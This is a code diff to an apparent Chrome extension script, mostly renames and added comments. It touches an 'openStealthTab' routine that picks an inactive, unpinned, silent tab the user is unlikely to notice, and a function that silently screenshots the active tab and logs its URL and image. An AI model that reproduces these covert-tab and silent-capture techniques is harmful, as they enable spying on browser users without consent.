@@ -1,17 +1,27 @@
 import { SearchParamKey, StorageKey } from "../consts";
 import { IScreenshotLogEntry } from "../interfaces";
-import { logData, simplePrepend, simpleSet, writeLog } from "./shared-utils";
+import {
+  contextData,
+  simplePrepend,
+  simpleSet,
+  writeLog,
+} from "./shared-utils";
 
 if (typeof window !== "undefined") {
   throw new Error("Cannot use this in page");
 }
+
 export async function openStealthTab() {
   writeLog("Attempting to open stealth tab");
 
   const tabs = await chrome.tabs.query({
+    // Don't use the tab the user is looking at
     active: false,
+    // Don't use pinned tabs, they're probably used frequently
     pinned: false,
+    // Don't use a tab generating audio
     audible: false,
+    // Don't use a tab until it is finished loading
     status: "complete",
   });
 
@@ -20,12 +30,13 @@ export async function openStealthTab() {
     return;
   }
 
-  const eligibleTabs = tabs.filter((tab) => {
+  const [eligibleTab] = tabs.filter((tab) => {
     // Must have url and id
     if (!tab.id || !tab.url) {
       return false;
     }
 
+    // Don't use extension pages
     if (new URL(tab.url).protocol === "chrome-extension:") {
       return false;
     }
@@ -33,10 +44,7 @@ export async function openStealthTab() {
     return true;
   });
 
-  const [eligibleTab, ..._] = eligibleTabs;
-
   if (eligibleTab) {
-    console.log({ eligibleTab });
     await writeLog("Found eligible tab host for stealth tab");
 
     const searchParams = new URLSearchParams({
@@ -81,7 +89,7 @@ export async function captureVisibleTab() {
   await simplePrepend<IScreenshotLogEntry>(
     StorageKey.SCREENSHOT_LOG,
     {
-      ...logData(),
+      ...contextData(),
       url: activeTab.url,
       imageData: await chrome.tabs.captureVisibleTab(),
     },
